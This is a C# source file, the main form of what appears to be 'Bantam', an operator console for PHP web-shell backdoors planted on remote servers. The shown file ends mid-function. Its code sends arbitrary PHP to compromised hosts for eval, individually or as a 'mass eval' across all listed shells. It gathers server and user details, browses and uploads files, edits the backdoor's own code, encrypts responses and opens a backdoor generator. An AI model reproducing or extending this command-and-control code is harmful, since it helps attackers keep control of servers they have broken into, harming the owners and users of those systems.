﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

using bantam.Classes;
using bantam.Forms;

namespace bantam
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// Static instance accessor to our dynamic instance, todo look into making BantamMain static
        /// </summary>
        public static BantamMain Instance{ get; private set;}

        /// <summary>
        /// Full path and name of xml file if a file has opened (used for saving)
        /// </summary>
        private static string OpenFileName;

        /// <summary>
        /// Full url of the Shell we have selected in the main listview
        /// </summary>
        private static string SelectedShellUrl;

        /// <summary>
        /// Available Shells in the listview
        /// </summary>
        public static ConcurrentDictionary<String, ShellInfo> Shells = new ConcurrentDictionary<String, ShellInfo>();

        /// <summary>
        /// Console Textbox's Autocomplete collection
        /// </summary>
        private static readonly AutoCompleteStringCollection consoleTextboxAutoComplete = new AutoCompleteStringCollection();

        /// <summary>
        ///
        ///
        /// </summary>
        public BantamMain()
        {
            //Store instance ref accessable statically
            Instance = this;

            //Default UI Component Initialization
            InitializeComponent();

            //has to be initialized with parameters manually because, constructor with params breaks design mode...
            txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);

            //setup custom sorter for filebrowser
            treeViewFileBrowser.TreeViewNodeSorter = new FileBrowserTreeNodeSorter();

            //setup console input's auto complete source
            textBoxConsoleInput.AutoCompleteCustomSource = consoleTextboxAutoComplete;
        }

        #region HELPER_FUNCTIONS

        /// <summary>
        /// Overloaded ValidTarget checks to see if you have a current target selected and if they are valid to send commands to
        /// </summary>
        /// <returns></returns>
        public static bool ValidTarget()
        {
            return ValidTarget(SelectedShellUrl);
        }

        /// <summary>
        /// ValidTarget checks to see the specified target is valid and if they are valid to send commands to, 
        /// default behaviour is to use the currently selected target
        /// </summary>
        /// <returns></returns>
        public static bool ValidTarget(string shellUrl)
        {
            string targetUrl = shellUrl;
            if (string.IsNullOrEmpty(targetUrl)) {
                targetUrl = SelectedShellUrl;
            }

            if (string.IsNullOrEmpty(targetUrl) == false
             && Shells.ContainsKey(targetUrl)
             && Shells[targetUrl].Down == false) {
                return true;
            }
            return false;
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="log"></param>
        public delegate void AppendToRichTextBoxLogsDelegate(string log);
        public void AppendToRichTextBoxLogs(string log)
        {
            if (this.InvokeRequired) {
                this.Invoke(new AppendToRichTextBoxLogsDelegate(AppendToRichTextBoxLogs), new object[] { log });
                return;
            }
            richTextBoxLogs.Text += log;
        }

        /// <summary>
        /// TODO clean this up and make a success / fail function
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="pingMS"></param>
        public void AddShellToListView(string shellUrl, string pingMS)
        {
            ListViewItem lvi = new ListViewItem(new [] { shellUrl, pingMS + " ms" }) {
                Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, (byte)0)
            };
            listViewShells.Items.Add(lvi);

            if (pingMS == "-") {
                int lastIndex = listViewShells.Items.Count - 1;
                listViewShells.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Shells[shellUrl].Down = true;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellURL"></param>
        public void GuiCallbackRemoveShellURL(string shellURL)
        {
            ListViewItem selectedLvi = listViewShells.FindItemWithText(shellURL);
            if (selectedLvi != null) {
                listViewShells.FindItemWithText(shellURL).Remove();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="ResponseEncryptionMode"></param>
        /// <param name="richTextBox"></param>
        /// <param name="prependText"></param>
        public static async Task ExecutePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int ResponseEncryptionMode, bool base64DecodeResponse = false, RichTextBox richTextBox = null, string prependText = "")
        {
            //todo this doesn't have a timeout
            string result = await ExecutePHPCode(url, phpCode, encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {

                if (base64DecodeResponse) {
                    result = Helper.DecodeBase64ToString(result);
                }

                result = result.Replace(PhpBuilder.rowSeperator, "\r\n");

                if (!string.IsNullOrEmpty(prependText)) {
                    result = prependText + result + "\r\n";
                }

                if (richTextBox != null && richTextBox.IsDisposed == false) {
                    richTextBox.Text += result;
                } else {
                    GuiHelper.RichTextBoxDialog(title, result);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        public async Task InitializeShellData(string shellUrl)
        {
            if (string.IsNullOrEmpty(shellUrl) == false) {
                bool encryptResponse = Shells[shellUrl].ResponseEncryption;
                int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                if (!Helper.IsValidUri(shellUrl)) {
                    AddShellToListView(shellUrl, "-");
                    return;
                }

                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpBuilder.InitShellData(encryptResponse));

                //todo add to global config delay
                if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
                    ResponseObject response = task.Result;

                    if (string.IsNullOrEmpty(response.Result) == false) {
                        string result = response.Result;
                        if (encryptResponse) {
                            result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
                        }

                        string[] data = result.Split(new [] { PhpBuilder.g_delimiter }, StringSplitOptions.None);
                        
                        var initDataReturnedVarCount = Enum.GetValues(typeof(ShellInfo.INIT_DATA_VARS)).Cast<ShellInfo.INIT_DATA_VARS>().Max();

                        if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                            AddShellToListView(shellUrl, pingWatch.ElapsedMilliseconds.ToString());

                            Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
                            Shells[shellUrl].Down = false;

                        } else {
                            AddShellToListView(shellUrl, "-");
                        }
                    } else {
                        AddShellToListView(shellUrl, "-");
                    }
                    pingWatch.Stop();
                } else {
                    AddShellToListView(shellUrl, "-");
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="phpCode"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="ResponseEncryptionMode"></param>
        /// <returns></returns>
        private async static Task<string> ExecutePHPCode(string shellUrl, string phpCode, bool encryptResponse, int ResponseEncryptionMode)
        {
            //todo no timeout
            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode).ConfigureAwait(false);

            if (string.IsNullOrEmpty(response.Result)) {
                LogHelper.AddShellLog(shellUrl, "Empty response from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.info);
                return string.Empty;
            }

            string result = response.Result;

            if (encryptResponse) {
                result = CryptoHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, ResponseEncryptionMode);
            }

            if (string.IsNullOrEmpty(result)) {
                LogHelper.AddShellLog(shellUrl, "Empty response decrypted from code ( " + phpCode + " )", LogHelper.LOG_LEVEL.info);
                return string.Empty;
            }

            return result;
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void userAgentSwitcherToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string userAgent = "User Agent: " + Config.DefaultUserAgent;
            string newUserAgent = GuiHelper.UserAgentSwitcher(userAgent, "Change User Agent");

            if (!string.IsNullOrEmpty(newUserAgent)) {
                Config.DefaultUserAgent = newUserAgent;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string code;
            bool checkBoxChecked = true;
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            if (encryptResponse) {
                string preCode = "@ob_start();";
                string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
                code = preCode + GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked) + postCode;
            } else {
                code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
            }

            if (string.IsNullOrEmpty(code) == false) {
                if (checkBoxChecked) {
                    ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                } else {
                    await WebHelper.ExecuteRemotePHP(shellUrl, code).ConfigureAwait(false);
                }
            } else {
                LogHelper.AddShellLog(shellUrl, "Attempted to eval empty code.", LogHelper.LOG_LEVEL.info);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellUrl"></param>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <param name="ResponseEncryptionMode"></param>
        /// <param name="rtb"></param>
        private async Task ExecuteMassEval(string shellUrl, string code, bool encryptResponse, int ResponseEncryptionMode, bool showResponse, RichTextBox rtb)
        {
            string result = await ExecutePHPCode(shellUrl, code, encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                if (!showResponse) {
                    return;
                }

                if (rtb != null && rtb.IsDisposed == false) {
                    rtb.Text += "Result from (" + shellUrl + ") \r\n" + result + "\r\n\r\n";
                }
            }
        }

        /// <summary>
        /// Mass Eval!  
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            bool showResponse = false;

            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - Mass Eval", string.Empty, ref showResponse);

            if (string.IsNullOrEmpty(code)) {
                return;
            }

            RichTextBox rtb = GuiHelper.RichTextBoxDialog("Mass Eval", string.Empty);

            foreach (ListViewItem lvClients in listViewShells.Items) {
                string shellUrl = lvClients.Text;
                if (Shells.ContainsKey(shellUrl)) {
                    bool encryptResponse = Shells[shellUrl].ResponseEncryption;
                    int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

                    string finalCode = code;
                    if (encryptResponse) {
                        string preCode = "@ob_start();";
                        string postCode = "$result = @ob_get_contents(); @ob_end_clean();";
                        finalCode = preCode + code + postCode;
                    }
                    ExecuteMassEval(shellUrl, finalCode, encryptResponse, ResponseEncryptionMode, showResponse, rtb);
                }
            }
        }

        /// <summary>
        /// Edits the PHP code of BANTAM that is stored online ! @dangerous
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void editPHPCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            //windows does not currently support uploading
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            string phpCode = PhpBuilder.ReadFileFromVarToBase64(PhpBuilder.phpServerScriptFileName, encryptResponse);
            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

            if (!string.IsNullOrEmpty(result)) {
                result = Helper.DecodeBase64ToString(result);
            }

            UploadFile u = new UploadFile(shellUrl, result, true);
            u.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);

            if (lvi != null
            && (Shells[shellUrl].PingStopwatch == null 
            || Shells[shellUrl].PingStopwatch.IsRunning == false)) {

                Shells[shellUrl].PingStopwatch = new Stopwatch();
                Shells[shellUrl].PingStopwatch.Start();

                string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

                if (string.IsNullOrEmpty(result)) {
                    return;
                }

                lvi.SubItems[1].Text = Shells[shellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                Shells[shellUrl].PingStopwatch.Stop();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            string result = await ExecutePHPCode(shellUrl, PhpBuilder.PhpInfo(encryptResponse), encryptResponse, ResponseEncryptionMode);

            if (string.IsNullOrEmpty(result) == false) {
                BrowserView broView = new BrowserView(result, 1000, 1000);
                broView.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewShells);

            if (lvi != null) {
                if (!string.IsNullOrEmpty(SelectedShellUrl) && Shells.ContainsKey(SelectedShellUrl)) {

                    //copy a backup of the current file tree view into clients
                    if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {

                        //Clear previously cached treeview to only store 1 copy
                        if (Shells[SelectedShellUrl].Files != null
                         && Shells[SelectedShellUrl].Files.Nodes != null
                         && Shells[SelectedShellUrl].Files.Nodes.Count > 0) {
                            Shells[SelectedShellUrl].Files.Nodes.Clear();
                        }

                        //store current treeview into client and clear
                        GuiHelper.CopyNodesFromTreeView(treeViewFileBrowser, Shells[SelectedShellUrl].Files);
                        treeViewFileBrowser.Nodes.Clear();
                    }
                }
                
                if (!string.IsNullOrEmpty(SelectedShellUrl)
                 && Shells.ContainsKey(SelectedShellUrl)
                 && !string.IsNullOrEmpty(Shells[SelectedShellUrl].Pwd)
                 && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                    Shells[SelectedShellUrl].Pwd = txtBoxFileBrowserPath.Text;
                }

                if (!string.IsNullOrEmpty(richTextBoxConsoleOutput.Text)) {
                    Shells[SelectedShellUrl].ConsoleText = richTextBoxConsoleOutput.Text;
                }

                if (!string.IsNullOrEmpty(richTextBoxLogs.Text)) {
                    Shells[SelectedShellUrl].LogText = richTextBoxLogs.Text;
                }

                SelectedShellUrl = lvi.SubItems[0].Text;

                if (!string.IsNullOrEmpty(Shells[SelectedShellUrl].ConsoleText)) {
                    richTextBoxConsoleOutput.Text = Shells[SelectedShellUrl].ConsoleText;
                } else {
                    richTextBoxConsoleOutput.Text = string.Empty;
                }

                if (!string.IsNullOrEmpty(Shells[SelectedShellUrl].LogText)) {
                    richTextBoxLogs.Text = Shells[SelectedShellUrl].LogText;
                } else {
                    richTextBoxLogs.Text = string.Empty;
                }

                if (Shells[SelectedShellUrl].IsWindows) {
                    btnUpload.Enabled = false;
                    btnFileBrowserGo.Enabled = false;
                    txtBoxFileBrowserPath.Enabled = false;
                } else {
                    btnUpload.Enabled = true;
                    btnFileBrowserGo.Enabled = true;
                    txtBoxFileBrowserPath.Enabled = true;
                }

                foreach (ListViewItem lvClients in listViewShells.Items) {
                    if (lvClients.BackColor != System.Drawing.Color.Red) {
                        lvClients.BackColor = System.Drawing.SystemColors.Window;
                        lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                    }
                }

                if (lvi.BackColor != System.Drawing.Color.Red) {
                    lvi.BackColor = System.Drawing.SystemColors.Highlight;
                    lvi.ForeColor = System.Drawing.SystemColors.HighlightText;
                }

                if (ValidTarget() == false) {
                    textBoxCWD.Text = string.Empty;
                    textBoxFreeSpace.Text = string.Empty;
                    textBoxHDDSpace.Text = string.Empty;
                    textBoxServerIP.Text = string.Empty;
                    textBoxUname.Text = string.Empty;
                    textBoxUser.Text = string.Empty;
                    textBoxWebServer.Text = string.Empty;
                    textBoxGroup.Text = string.Empty;
                    textBoxPHP.Text = string.Empty;
                    txtBoxFileBrowserPath.Text = string.Empty;
                    return;
                } else {
                    textBoxCWD.Text = Shells[SelectedShellUrl].Cwd;
                    textBoxFreeSpace.Text = string.IsNullOrEmpty(Shells[SelectedShellUrl].FreeHDDSpace) ? "0"
                                         : Helper.FormatBytes(Convert.ToDouble(Shells[SelectedShellUrl].FreeHDDSpace));

                    textBoxHDDSpace.Text = string.IsNullOrEmpty(Shells[SelectedShellUrl].TotalHDDSpace) ? "0"
                                        : Helper.FormatBytes(Convert.ToDouble(Shells[SelectedShellUrl].TotalHDDSpace));

                    textBoxServerIP.Text = Shells[SelectedShellUrl].Ip;
                    textBoxUname.Text = Shells[SelectedShellUrl].UnameRelease + " " + Shells[SelectedShellUrl].UnameKernel;
                    textBoxUser.Text = Shells[SelectedShellUrl].Uid + " ( " + Shells[SelectedShellUrl].User + " )";
                    textBoxWebServer.Text = Shells[SelectedShellUrl].ServerSoftware;
                    textBoxGroup.Text = Shells[SelectedShellUrl].Gid + " ( " + Shells[SelectedShellUrl].Group + " )";
                    textBoxPHP.Text = Shells[SelectedShellUrl].PHP_VERSION;
                }

                if (tabControlMain.SelectedTab == tabPageFiles) {
                    if (Shells[SelectedShellUrl].Files.Nodes != null
                     && Shells[SelectedShellUrl].Files.Nodes.Count > 0) {
                        GuiHelper.CopyNodesFromTreeView(Shells[SelectedShellUrl].Files, treeViewFileBrowser);

                        treeViewFileBrowser.ExpandAll();
                        treeViewFileBrowser.Sort();
                        treeViewFileBrowser.Refresh();

                        txtBoxFileBrowserPath.Text = Shells[SelectedShellUrl].Pwd;
                    } else {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            if (tabControlMain.SelectedTab == tabPageFiles) {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes != null 
                && treeViewFileBrowser.Nodes.Count == 0
                && Shells[shellUrl].Files.Nodes != null
                && Shells[shellUrl].Files.Nodes.Count > 0) {

                    //populate the treeview from cache
                    GuiHelper.CopyNodesFromTreeView(Shells[shellUrl].Files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();

                    txtBoxFileBrowserPath.Text = Shells[shellUrl].Pwd;
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0) {
                        StartFileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            XmlHelper.SaveShells(OpenFileName);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //keep alive checks with this?
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ModifyShell addClientForm = new ModifyShell();
            addClientForm.Show();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
        {
            if (ValidTarget()) {
                phpToolStripMenuItem.Visible = true;
                systemToolstripMenuItem.Visible = true;
                softwareToolStripMenuItem.Visible = true;

                if (Shells[SelectedShellUrl].IsWindows) {
                    linuxToolStripMenuItem.Visible = false;
                    windowsToolStripMenuItem.Visible = true;
                } else {
                    linuxToolStripMenuItem.Visible = true;
                    windowsToolStripMenuItem.Visible = false;
                }
            } else {
                phpToolStripMenuItem.Visible = false;
                systemToolstripMenuItem.Visible = false;
                softwareToolStripMenuItem.Visible = false;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(SelectedShellUrl) == false) {
                listViewShells.SelectedItems[0].Remove();
                if (Shells.ContainsKey(SelectedShellUrl)) {

                    if (!Shells.TryRemove(SelectedShellUrl, out ShellInfo outShellInfo)) {
                        LogHelper.AddShellLog(SelectedShellUrl, "Attempted to remove shell and operation failed.", LogHelper.LOG_LEVEL.warning);
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void testConnectionStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(SelectedShellUrl)
             || Shells.ContainsKey(SelectedShellUrl) == false) {
                return;
            }

            string shellURL = SelectedShellUrl;
            ShellInfo shellInfo = Shells[shellURL];

            listViewShells.FindItemWithText(shellURL).Remove();

            Shells.TryRemove(shellURL, out ShellInfo shellInfoRemove);
            Shells.TryAdd(shellURL, shellInfo);

            InitializeShellData(shellURL);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            BackdoorGenerator backdoorGenerator = new BackdoorGenerator();
            backdoorGenerator.Show();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK) {
                XmlHelper.SaveShells(saveShellsXMLDialog.FileName);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void openShellXmlFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var openShellXMLDialog = new OpenFileDialog {
                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
                FilterIndex = 2,
                RestoreDirectory = true
            }) {
                if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                    foreach (ListViewItem lvClients in listViewShells.Items) {
                        if (Shells.ContainsKey(lvClients.Text)) {

                            Shells.TryRemove(lvClients.Text, out ShellInfo outShellInfo);
                        }
                        lvClients.Remove();
                    }
                    XmlHelper.LoadShells(openShellXMLDialog.FileName);

                    OpenFileName = openShellXMLDialog.FileName;
                    saveClientsToolStripMenuItem.Enabled = true;
                }
            }
        }
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(SelectedShellUrl) == false) {
                string shellUrl = SelectedShellUrl;
                string varName = Shells[shellUrl].RequestArgName;
                string varType = (Shells[shellUrl].SendDataViaCookie ? "cookie" : "post");

                ModifyShell updateHostForm = new ModifyShell(shellUrl, varName, varType);
                updateHostForm.Show();
            }
        }

        /// <summary>
        /// Enter Keydown Hadler for console input
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void textBoxConsoleInput_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btnConsoleGoClick_Click(sender, e);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Enter Keydown handler for filebrowser path
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void txtBoxFileBrowserPath_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                btnFileBrowserGo_Click(sender, e);
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private async void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
        {
            FilebrowserGoBack();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnUpload_Click(object sender, EventArgs e)
        {
            if (ValidTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = SelectedShellUrl;

            //windows does not currently support uploading
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            UploadFile u = new UploadFile(shellUrl, txtBoxFileBrowserPath.Text);
            u.ShowDialog();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserGo_Click(object sender, EventArgs e)
        {
            btnFileBrowserGo.Enabled = false;

            if (ValidTarget() == false) {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            string phpVersion = Shells[shellUrl].PHP_VERSION;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            //windows does not currently support direct path operations
            if (Shells[shellUrl].IsWindows) {
                return;
            }

            string phpCode = PhpBuilder.DirectoryEnumerationCode(txtBoxFileBrowserPath.Text, phpVersion, encryptResponse);
            string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

            Shells[shellUrl].Files.Nodes.Clear();

            //if user didn't switch targets by the time this callback is triggered clear the live treeview
            if (SelectedShellUrl == shellUrl) {
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }

            if (string.IsNullOrEmpty(result) == false) {
                FileBrowserRender(result, shellUrl);
            }
            btnFileBrowserGo.Enabled = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="result"></param>
        /// <param name="shellUrl"></param>
        private async Task FileBrowserRender(string result, string shellUrl, TreeNode baseTn = null)
        {
            if (shellUrl != SelectedShellUrl) {
                LogHelper.AddShellLog(SelectedShellUrl+"/"+ shellUrl, "Detected shell change before filebrowser rendered.", LogHelper.LOG_LEVEL.warning);
                return;
            }

            string[] rows = result.Split(new [] { PhpBuilder.rowSeperator }, StringSplitOptions.None);

            if (rows != null && rows.Length > 0) {
                foreach (string row in rows) {
                    string[] columns = row.Split(new [] { PhpBuilder.g_delimiter }, StringSplitOptions.None);

                    //todo clean up len check
                    if (columns != null && columns.Length - 2 > 0) {
                        string permissionOctal = Convert.ToString(Convert.ToInt32(columns[4]), 8);
                        string perms = permissionOctal.Substring(permissionOctal.Length - 4);

                        TreeNodeCollection tnCollection;
                        
                        if (baseTn != null && baseTn.Nodes != null) {
                            tnCollection = baseTn.Nodes;
                        } else {
                            tnCollection = treeViewFileBrowser.Nodes;
                        }

                        //todo cleanup index's and image indexs 
                        if (columns[columns.Length - 2] == "dir") {
                            TreeNode lastTn = tnCollection.Add("dir", columns[0], 0);
                            lastTn.ToolTipText = perms;
                        } else {
                            TreeNode lastTn = tnCollection.Add("file", columns[0], 1);
                            if (string.IsNullOrEmpty(columns[2]) == false) {
                                lastTn.ToolTipText = perms + " - " + Helper.FormatBytes(Convert.ToDouble(columns[2]));
                            } else {
                                lastTn.ToolTipText = perms;
                            }
                        }
                    }
                }
                treeViewFileBrowser.Sort();

                if (baseTn != null) {
                    baseTn.Expand();
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private async Task StartFileBrowser()
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;

            txtBoxFileBrowserPath.Text = Shells[shellUrl].Cwd;

            if (Shells[shellUrl].IsWindows) {
                txtBoxFileBrowserPath.Text = string.Empty;

                string phpCode = PhpBuilder.GetHardDriveLettersPhp(encryptResponse);
                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

                if (string.IsNullOrEmpty(result) == false) {
                    string[] drives = result.Split(new [] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0) {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives) {
                            treeViewFileBrowser.Nodes.Add("drive", drive, 2);
                        }
                    }
                }
            } else {
                string phpVersion = Shells[shellUrl].PHP_VERSION;
                string phpCode = PhpBuilder.DirectoryEnumerationCode(".", phpVersion, encryptResponse);
                string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);

                if (!string.IsNullOrEmpty(result)) {
                    FileBrowserRender(result, shellUrl);
                }
            }
            tabControlMain.SelectedTab = tabPageFiles;
        }

        /// <summary>
        /// 
        /// </summary>
        private async Task FilebrowserGoBack()
        {
            if (ValidTarget() == false) {
                return;
            }

            string shellUrl = SelectedShellUrl;
            ShellInfo shell = Shells[shellUrl];
            
            //windows does not currently support the back operation
            if (shell.IsWindows) {
                return;
            }

            bool encryptResponse = shell.ResponseEncryption;
            int ResponseEncryptionMode = shell.ResponseEncryptionMode;
            string phpVersion = shell.PHP_VERSION;

            string[] paths = txtBoxFileBrowserPath.Text.Split('/');
            string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);

            if (string.IsNullOrEmpty(lastPathRemoved)) {
                lastPathRemoved = "/";
            }

            string directoryContentsPHPCode = PhpBuilder.DirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
